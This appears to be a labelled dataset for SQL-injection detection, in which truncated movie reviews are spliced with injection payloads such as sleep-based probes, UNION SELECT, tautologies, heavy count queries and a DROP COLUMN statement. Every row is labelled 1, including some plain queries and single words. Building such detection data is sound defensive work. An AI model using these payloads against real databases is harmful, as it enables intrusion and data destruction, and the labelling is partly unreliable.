query,label,length
"Sequels hardly ever live up to the original. This definitely proves true in this case. However, if you're a big fan of the original than definitely give this a watch. Although the camera work is lacking, Brian Krause's character is annoying, and the plot is clique, it's much more funnier than the first and that is what I find entertaining abo""1"" where 8635 = 8635 and 4595 = 4595#",1,382
I didn't realize just how much of this episode was taken from The Enemy Below until I finally saw the movie ('1'+ ( select somn where 8636 = 8636 rlike sleep ( 5  )  )  +',1,171
"On monday, earlier this week, sometime in July, I happened to be under the influence of the sweet leaf, and me being a horror fan, wanted to see something scary. I was thinking of The Ammityville Horror 2, but I got something way better. I was at my friend's house, and he had the VHS Evil Ed. No cover or anything, he didn't even see the whole thing himself, but he told me it was about ""A guy who goes crazy and kills a lot of people."" Well, this movie was very shocking,I've never seen the actual brutal nature of sadistic violence until this movie, It buries Ted Bundy and Ed Gein both! It is pretty funny too, with references to The Evil Dead trilogy( and plus the Evil Dead 2 poster is everywhere in the movie!) The movie is about Edward, a obsessive-compulsive, nice guy, who happens to be a film editor. He is then lent to another department in the building, and he i""select count ( * )  from generate_series ( 1,5000000 )  and  ( ""kngx"" like ""kngx",1,956
"x' and members.email is NULL; --I never watched the 'Next Action Hero' show, and until reading the other comments here, did not know that this movie was the 'prize' from that competition. I was just flipping channels and came across this, and found myself watching, dare eagerly, all the way to the end.<br /><br />Yes, the plot's been done (The Most Dangerous Game, etc.) but I was hoping for, and almost received, the 'gotcha' - how the protagonist was going to beat the hunter in the end. I think the high-tech was overdone (GPS's) and gave me cold-sweat flashbacks of Night Rider, but it nevertheless was not t",1,614
union select * from users where login   =   char ...,1,52
"ENd;&&	;  (}  :(, .:(@ 'NhuB'='NHUb",1,35
"I cannot see why filmmakers remade this movie. <br /><br />The 1972 movie with McQueen and McGraw is almost a classic. Steve McQueen was an outstanding actor and Baldwin is only an inadequate actor. He has no passion in his play.Also the action in the original ""Getaway"" was fantastic. But the remake has ' select sleep ( 5 )  and   (  (   ( ""zlal"" = ""zlal",1,356
 (  select * from   (  select  (  sleep  (  5   )    )     )  lrov  ) ,1,70
"One Stinko of a movie featuring a shopworn plot and, to be kind, acting of less than Oscar caliber. But to me the single worst flaw was the total misrepresentation of a jet aircraft, and especially a 747. Some of the major blunders:<br /><br />1. No Flight Engineer (or even a flight engineer station. 2. Mis-identifying the F-16 interceptors as F-15's (no resmblance whatsoever). 3. Loading passengers into an ""aft baggage compartment"" supposedly accesible from the cabin - Even if such a compartment existed, placing that much weight that far aft would make the aircraft unflyable. 4. Hollow point bullets that ""won't 'select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( ""vabm"" = ""vabm",1,732
"1%"" uni/*I really wanted to love this film. I have read the book to my daughters and we all loved it. The book is marvelous. This film is very far from the book. The book is splendid - this film is an awful adaptation.<br /><br />In the book, Sara is honorable, kind, strong, and NEVER does anything spiteful to get back at anyone. That's the POINT of the book! She behaves as a ""princes"" regardless of circumstances. An important part of behaving like a princess is to not return unkindness. It is to behave honorably regardless of how you are being treated.<br /><br />In the book, she endures much and touches the lives of others. Other people change their behaviors after they witnessed her kindness and ability to endure without sinking to spite and vengefulness. Sara does what is right simply BECAUSE it is RIGHT.<br /><br />Outside of the bakery, she comes upon a beggar girl who is more poor and hungry than she is. She has half a dozen hot buns. She is VERY h*/on all select null#",1,990
"Von Trier once explained how he created such strong involvement from the viewer with his movies by placing his movie world in about the middle of the real world and the imagined world. So as viewers we think we watch a ""true"" story while in fact we are thoroughly manipulated, often to the point that the movie works disturbing (Dancer in the Dark) or painful (The Idiots/ Idioterne). Of course the Dogme-films acted only as a vehicle for this theory (besides creating some welcome spotlight on Von Trier).<br /><br />The story is typical for Von Trier: our hero is idealistic, seems to balance his relations with everybody else, but soon becomes the victim of the problems others have created in the past for themselves. The idealist inevitably has to reject society in order to stay idealistic and becomes the terrorist. Mankind is spoiled and purity on'1' and 1661 = 1244 and 'dcha' = 'dcha",1,893
"29/*and anyone who watches this film will agree. This film was directed in the days when plot, character believability and theme actually mattered.<br /><br />Jean Peters, Widmark, and Thelma Ritter steal the spotlight. Ritter is in top form as informer ""Moe"" she survives in the Bowery section of NY, acting as a stool pigeon for NYC police.<br /><br />The only other film in which I have seen Peters is ""Niagara"", and she certainly proves her acting ability here, complete with Brooklyn accent. Widmark is appropriately menacing, as the anti-hero who must discern*/ %",1,569
hI'^Or	'a'?(NOt~like`)	'a,1,25
"Pixote is directed with barely a shred of sentimentality. And yet I more than imagine Hector Babenco owes some of his film-making chops with this film to Vittorio De Sica's neo-realist style, in particular Shoeshine (that film, as with Pixote, takes place mostly inside a children's prison). And yet while I might still prefer De Sica's film if it came down to deciding between the two it's so close because it is, no pun intended, like choosing between two children. They're both marvelous works of raw drama, and with Pixote Babenco has an extra edge and harrowing quality to deal with in that this isn't filmed in conditions brought on after a world war. This is how it was in Brazil- one would""1""  )  )   and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""gxqq"" = ""gxqq",1,839
"Irrespective of the accuracy of facts, Bandit Queen is a true story, its true because the themes it deals with hold as much truth today as they did way back in 1994. This movie is violent, powerful and thought provoking.The protagonist is a woman of flesh and blood, whose adversity brought out the best(or worst) out of her. Keeping the subjectivity aside, there is no doubt that Phoolan's character from a young girl of 8, who is married off by her father to clear a debt(pun intended), to a gang leader who goes on to become a leader of the lower caste, has evolved into a champion in her own right. Her portrayal is so powerful that the viewer is even willing to forgive her for a massacre.<br /><br />I can understand if the western audience is not able to appreciate this masterpiece, Bandit Queen needs to be 'studied' in the Indi""5739-5738",1,847
"There are pretty landscape shots. Writers putting trite mouthings into actors mouths. With lesser actors this show would be silly. 'Art must uplift humanity or it's BS.' Not so because art of all those mentioned is also to stir humanity and express the dark side. The lead character even says those who don't drink hide the shadow side. Wrong , he lived in darkness and repressed his dark side by drinking and being one dimensional not expanding his horizons with something other than landscapes. There wasn't a breathing organism in his work nor expression of his pain. All the artist did was limit himself to dime a dozen landscapes. The discussions between the characters was grade school, trite stuff always giving the one character the upper hand the writer wanted. I tried to like it after reading all the first wow comments on here. I had to dig deep to see those i agreed with. I figure the great comments were from those ' end and 'blit' = 'blit",1,954
"select case when 1238 = 9044 then 1 else null end--i am not exactly how sure the accuracy is with this movie, but i can tell you that i was thoroughly entertained by this movie. the character of gust,played perfectly by Phillip Seymour Hoffman, was one of the most unique, yet entertaining characters in recent memory. this movie informed,yet managed to avoid preaching ",1,370
"By 1950, John Ford had already fully-developed the ideas and motifs that would form the core of his most successful Westerns. Always present, for example, is a strong sense of community, most poignantly captured in the Joad family of Steinbeck's 'The Grapes of Wrath (1940).' Within these communities, even amid Ford's loftier'1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""ncym"" like ""ncym",1,425
"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111                                                                                                                                                                                                                                      1"" where 6501 = 6501",1,526
"-5286' or 67/*THE STUDENT NURSES is not a typical sexploitation movie. Sure, the nudity and sexual openness is there, but it's not all for laughs. Stephanie Rothman scripted a socially compelling, well-written tits & ass movie which confronts the topics of racism, socio-economic inequalities, rape, abortion, medical ethics, public health issues, human rights, the Vietnam war, free love, LSD and drug experimentation. Four sexy college roommates are taking their nursing internships at the same time. Sharon (Elaine Giftos) is assi*/83 = 1233",1,544
"One of the more intelligent serial killer movies in recent history. ZODIAC KILLER offers an imaginative take on the background and history of one of the most notorious serial killers. The filmmakers create an unexpectedly good insight into the pathology of this mysterious killer, and anyone who remembers Zodiac will be intrigued. Others will want to discover more about this enigmatic criminal. Unlike many serial killers, Zodiac was not insane at all but very methodical and a self-promoter. The director here plays viewer expectations and pulls it off. The film is constructed as a murder mystery, or a ""cold case""-style thrille""1"" and 4996 = 4431 and ""jzaq"" = ""jzaq",1,670
"I've always knew Anne DeSalvo was a great character actor, now I know she is a great writer/director also. I have been a fan since I first saw her in the movies ""Perfect"", ""My Favorite Year"", ""DC Cab"" and ""Stardust Memories"".<br /><br />It's so rare to see Lee Gr' or 2 between 1 and 3",1,285
"The Vietnam War era is certainly far before my time, but it has always interested me, and I have seen many films about it. All of the others I'd seen had dealt strictly with the front-line of battle. When I read a description of ""The War At Home,"" I found the concept intriguing. No Vietnam War movie I'd ever heard of talked about what happens to a soldier once the fighting is over with. <br /><br />One night, while flipping through channels, the movie aired on The Sundance Channel. I set down the remote and ""1 )  and sleep ( 5 ) ",1,535
"I saw this film last night at a ""pre-Code"" film festival, and I have to tell you that when Gary Cooper turned his head for his introductory close-up, the entire audience gasped. He was just that beautiful.<br /><br />Cooper's looks aside, this film displays Rouben Mamoulian's directorial artistry to perfection. Wonderful scene-fades, creative came""1 )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ",1,469
"Had this film been put together a tad better, it would be up there with the best of Astaire and Rogers. As it is, it's a fine movie but overly long with a tedious subplot, i.e., Randolph Scott romancing Rogers' sister, played by Harriet Hilliard (that's Ozzie Nelson's wife to you baby boomers).<br /><br />Astaire and Scott are two Navy men. Scott meets Hilliard the first time when she looks like a stereotypical librarian, and later on after Ginger Rogers has asked her friend (a blond but unmistakable Lucille Ball) to glamor her up. Meanwhile, Astaire tries to pick up where he and his old dancing partner left off. The result is some wonderful dance numbers, with Astaire and Rogers as a team as well as separately: ""I'm Putting All My Eggs in One Basket,"" ""Let Yourself Go,"" and ""I'd Rather Lead the Band."" Hilliard is sweet but a little lethargic as a plain Jane turned glamor girl, although she s'1"" )  as wmng where 5976 = 5976",1,937
"As far as I can understand, TIW WATCHER is the first work of a young director. My doubt is if this is the work of a regular guy who happens to love films or if this is the work of a cinema student, since there is a reference to Oporto School of Arts in the final credits.<br /><br />Nevertheless, director Ricardo Pinho demonstrates with this movie a total unawareness of some basic notions about cinema. What is a movie? How to tell a story? It doesn't matter, for the novice director. One of the first things you learn in school when you're studying cinema is how to tell a story. You learn that, just like in novels, in movies you should also construct your story in three acts: the""1' and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1,799
"If it wasn't for the terrific music, I would not hesitate to give this cinematic underachievement 2/10. But the music actually makes me like certain passages, and so I give it 5/10.'1' or sleep ( 5 ) ",1,200
"Misfits at a military school? Hmmmm, sounds funny, maybe offensive to ""?s",1,73
rEPLAce,1,7
ebmgy0cnozqivsyfcqcuvvulwjav4njoxv80675ouw9g6nup3dxy9 n3xzsjgm1d6bfp7t sq1ycsbt4 fwmww0ozp8r9nrn eawo4d2h mrmamzs4tg mo7neraf8c38vfht8llvj668fu9hryzqcu8nqtmnzmwf4fbhligyfek7mti7mc 6wqquc9757ianasgw0qj0483jzfko979k535d8udgsa5ai3ta7oo15u9546k6e7et639a4t 5dozoij3ld51lc26eqk3idlk8s3w2cedfv8a43vxd cguxd6foaq einyegyg3qyw3sm3vaac1tmtt9meyr k7vblg814mjjvnczvkmqxumvtthjm3ah3i5ok2i yv6olgsu09b77ve0hd5zptge6p592w5wvtetshblfhz9sh7koyo4s44eioyb45m5v3e53cea6yx2cpejj4wgburhsw9btan4s46sab8ppwb4dywkimzqr1 where 6365 = 6365,1,512
to_timestamp_tz,1,15
CREATE OR REPLACE VIEW view_name AS,1,35
"1%"" )  order by 1--this movie is made for Asian/Chinese market, targeting particularly fans of Jay Chou, one of the biggest music star in Asian.<br /><br />Jay Chou is a very talented song writer/singer. He is mediocre as an actor, although he did appear in several big-budget productions (""initial D"", ""Curse of the Golden Flower ""). Amazingly, he won both golden horse (taiwan) and Hong Kong film awards for ""initial D"".<br /><br />The su",1,440
"It's taken years for cult icon Bruce Campbell to get this project off the ground - but he finally has, it's here - and what a great piece of schlock entertainment it is! Looking at the plot; it sounds like two things. A great base for a very silly B-movie, and a shameless excuse for Bruce Campbell to what he does best - Evil Dead II style slapstick humour, and this film delivers on both counts. The Man With the Screaming Brain is comic book nonsense all the way through - but there's some really great scenes, and it's almost impossible to be b""1%' or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and '%' = '",1,615
SELECT AVG ( Price ) FROM Products,1,34
"# from wapiti--I cannot understand why so many people did not like this film. Robert De Niro was on top of his game, delivering his lines with such aplomb, one has to believe this is his everyday demeanor. Granted, the film seemed to take on many buddy-film conventions while trying to make fun of the concept, it goes without saying this film was genuinely funny. From the police dog, to the fact Eddie Murphy didn't annoy the heck out of me, this film is a real keeper. Rene Russo also evened out the rest of the cast perfectly, establishing her role so it does not interfere with the budding relationship between De Niro and Murphy.",1,635
3.10E+17--This is an excellent show! ,1,37
"This wonderful film has never failed to move me. The colour, convincing cast, and stunning scenery all make big contributions. This production, unlike the later remake by Carlton, is more impressionistic, and presented more from the children's own perspective. It focusses on certain episodes from E. Nesbit's charming story rather than trying to make a somewhat more documentary ""warts-and-all"" style that Carlton adopts. Above all, the superb musical score of the late Johnny Douglas underpins the story throughout, adding extra emotional depth. The net result is a truly formidable combination of sensory experiences that cumulatively present the poignant story of ""The Railway Children"".<br"" end and   (  (   ( 'xzbk' = 'xzbk",1,729
"I saw this movie last night and thought it was decent. It has it's moments I guess you would say. Some of the scenes with the special ops forces were cool, and some of the location shots were very authentic. I won't be putting this movie in my DVD collection but it is fair enough to recommend for renting. I guess nothing set the movie at another level compared to others of the same genre. The action is good, the acting is decent, the women are extremely seductive and exotic in my opinion, and the story is pretty interesting. 7 out of ten""1' )  as pudv where 2609 = 2609",1,575
"The storyline has too many flaws and illogical sequences to be worthwhile. Jolie's acting is pretty flat and poor, Washington's is OK, the rest of the cast are cardboard cutouts. Somehow almost everything about this film oozes mediocrity. The plot is lame. The only thing I liked more or less about this film are the fairly original methods the perpetrator uses to end his victims. Technical details are worse than the most far-stretched CSI 'knowledge' and gizmos and halfway the movie one wonders if the director even cared about detail credibility. (Some Spoilers hereafter!) I mean, an EKG machine with a pure sinus wav""select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  7749 = 7749",1,726
"I bought this video on a throw-out table at the video store expecting a good cast in what was touted as an award-winning Brit sex comedy. I guess I should have read the finer print. I rarely write a panning review, but here goes.<br /><br />These actors in gay roles really play games with yo""1  )  )   as wwys where 9248 = 9248",1,328
"26/*Let me get the bad out of the way first, James Hanlon is absolutely terrible trying to act his descriptions of what was going on with the rookie training and events of the day. Really it is in stark contract to the other fire fighters without acting aspirations who are natural in their delivery.<br /><br />That said*/ %",1,325
'-',1,3
"1 where 1519 = 1519--I saw this on the Sci-Fi Channel so I knew it would be bad to start with but I was surprised at how much worse it was than expected. The CG effects on the dragon were terrible, even fo",1,205
"...the world may never know. (The film that did take the ""best animated short"" Oscar that year, ""Anna and Bella"", is very good, but it's no ""Big Snit"". Both are available on Expanded Entertainment's ""World's Greatest Animation"" compilation, in case you'd like to compare.)<br /><br />""Snit"" and its director, Richard Condie, have attracted so much attention that there's little for me to add. I'd like to note, however, that the film contains one of my very favorite single ""shots"" in an animated short, the one where the man opens the door to let the cat out. I don't want to give away the actual events depicted here, but the first time I saw the shot I was whipsawed from one mood to another, then seconds later to still another. That shot has never fa""1 )  or sleep ( 5 ) ",1,776
"Yes, commitment. Let's say ""Fever Pitch"" might trick you into believing it's a baseball movie.<br /><br />But no, you don't have to be a baseball fan to actually enjoy this picture from the Farrelly Brothers. But of course, if you are one, you will enjoy it even more; with all the references (pretty accurate ones, I'd say) to the Boston Red Sox and its bittersweet history; from the Curse of the Bambino and everything attributed to it, including those two words you CANNOT pronounce in front of a Boston fan: Bill Buckner.<br /><br />Drew Barrymore and Jimmy Fallon portray two people who, usually might have second thoughts of going into a relationship: the successful workaholic who is als""1""  )  )   as xbhp where 7527 = 7527",1,731
SELECT * FROM Customers  WHERE CustomerName LIKE 'a_%_%',1,56
"""Triumph of Love"" is proof that not every Comédie-Française author who uses cross-dressing disguised courtship like Shakespeare is worth seeing. <br /><b'1 )  where 7026 = 7026",1,176
" select * from users where id = 1 or "";#"" or /*Pam Grier is the super soul sister of the 1970's, appearing in many blaxploitation films that have recently been discovered and appreciated by a new generation. I can safely say that BLACK MAMA, WHITE MAMA may be the worst Pam Grier movie I've ever seen.<br /><br />Grier is Lee and Margaret Markov is Karen; they are two female prisoners who escaped from prison after Karen's revolutionary friends attacked the paddy wagon. Chained to each other, the film becomes THE DEFIANT ONES for women, but has three separate plots: a fat criminal (Filipino sleaze star Vic Diaz) wants Lee dead, a cowboy bounty hunter (the excellent Sid Haig) searches for the two girls; and Karen's revolutionary friends search for her. The film eventually becomes so convoluted and uninvolved with the two women that the title should have been MEN CHASING WOMEN. Grier, an action star, is not given any chance to participate in any of the many (*/1 = 1 -- 1",1,980
" UNION?ALL
SELECT",1,18
ALTER TABLE clientes DROP COLUMN senha;,1,39
ALTER TABLE clientes DROP COLUMN senha; --,1,42
 ,1,1
"... so what's in those missing 10 minutes that were so horrible they had to cut them out from the original film? We were three years into the film production code... Barbara Stanwyck had starred in the original play, but here, Carole Lombard plays Maggie King. Co star Fred MacMurray is probably best known for ""Double Indemnity"", with Stanwyck, as well as his hit TV show ""My Three Sons"". Keep an eye out for a young Dorothy Lamour (Bob Hope movies) and the too-fabulous Franklin Pangborn, who spiced up just about every film put on tape. Of cou""1 where 9872 = 9872",1,566
"Not even Goebbels could have pulled off a propaganda stunt like what Gore has done with this complete piece of fiction. This is a study in how numbers and statistics can be spun to say whatever you have predetermined them to say. The ""scientists"" Gore says have signed onto the validity of global warming include social workers, psychologists and psychiatrists. Would you say a meteorologist is an expert in neuro-surgery? The field research and data analysis ""1 where 9774 = 9774",1,480
"In the immediate aftermath following World War II, sound minds in Hollywood tried to distance themselves from the mindless flag-waving that is a natural ingredient in a war effort. ""Best Years of Our Lives' and even 'Gentleman's Agreement' investigated the way Americans looked at themselves in the wake of the war, but Delmer Daves' ""Pride of the Marines"" beat them to it.<br /><br />The film is about Philadelphia smart alec John Garfield who goes to war as a marine and after a nightmarish evening in a foxhole, with Japanese soldiers eerily cry'1' )  as sjij where 8659 = 8659",1,580
SELECT * FROM [Brazil Customers],1,32
"This film was a waste of time, even rented on DVD. If super-speedy camera shots get any faster than this, we might as well pay twenty bucks to get in the laundromat, get popcorn, and watch the dryer spin. Jet Li is so much better than this. One can only hope that he won't be making deals anytime soon to make another cliche-ridden film like The One.<br /><br />If there's one film you should avoid, this is ""The One"".'-9379 )  or make_set ( 9354 = 9354,7185 )  and  ( 9212 = 9212",1,480
"It amazes me that someone would actually consider spending some money on a movie like this. Really. Let's forget for a second that the plot doesn't even give a single hint of originality... Most of the movies today are based on other movies' stories, so a ""simple"" lack of originality is not that big a deal. <br /><br />But I can hardly believe that none of the guys involved in the movie had never even got on a plane before shooting this. Because, let's be honest, that would be the only excuse to come up with something so ridiculous. To be sincere I think a 6-years-old child with a fake camera could have come up with something technically much more bel""1'  )  )   as pgif where 6346 = 6346",1,696
"99999999999999999999999999999999933333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333331"" where 4319 = 4319",1,810
8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888880000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 where 9404 = 9404,1,919
"I have seen this movie a number of times and find it very compelling and sad. The lack of real emotion from most of the characters is very disturbing. They seem empty, hopeless. The story is based on a real event.<br /><br />A teenage girl is murdered by her boyfriend for no obvious reason - apparently he just felt like it. Then he boasts about it to his friends and as they don't believe him he takes them to view the body - a number of times. No one reports the murder. There are two strong leads - Keanu Reeves and Crispen Glover - Crispen Glovers character is seriously annoying.<br /><br />Keanu's character Matt appears to be'-9555'  )  )   )  or  ( 8459 = 8459 ) *4906 and   (  (   ( 'rwpq' like 'rwpq",1,710
insert,1,6
"During a sleepless night, I was switching through the channels & found this embarrassment of a movie. What were they thinking?<br /><br />If this is life after ""Remote Control"" for Kari (Wuhrer) Salin, no wonder she's gone nowhere.<br /><br />And why did David Keith take this role? It's pathetic!<br /><br />Anyway, I turned on the movie near th'select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and  ( '%' = '",1,460
"The only connection this movie has to horror is that it is horribly unentertaining. I would rather prick my finger with a rusty nail than have to sit through it again. Even for a TV movie it is flat. The cast is boring. The screenplay is as exciting as a bowl of sand. How two directors conspired to create such a nothing movie will remain one of the great mysteries of the 20th Century. There is only one scene even vaguely worthy of inclusion in the Omen franchise, and it is shot in slo-mo and cut short at the anticipated pay-off. If you are tempted to see this, pop it in, set your alarm clock for 90 minutes and get comfy. With any luck you'll doze off quickly, and the alarm will wake you once the worst""1 )  where 6472 = 6472",1,733
"Swayze doesn't make a very convincing Alan Quatermain. Compared to Stewart Granger; which growing up was my ultimate hero in films like the 1952 ""Scaramouche"", the 1952 ""Prisoner of Zenda"" and the 1950 ""King Solomon's Mines""; Patrick Swayze fails utterly. Even the portrayal of an older Alan Quatermain by Sean Connery in ""League of Extraordinary Gentlemen"" was very good in an otherwise big flop. Also Alison Doody lacks the grace of Deborah Kerr in the role of the leading lady, and last but not least the impressive Siriaque in the role of Umbopa makes it very hard for anyone to fill his (shoes)!!! For someone who was disappointe'select sleep ( 5 )  and 'eskp' like 'eskp",1,676
insert,1,6
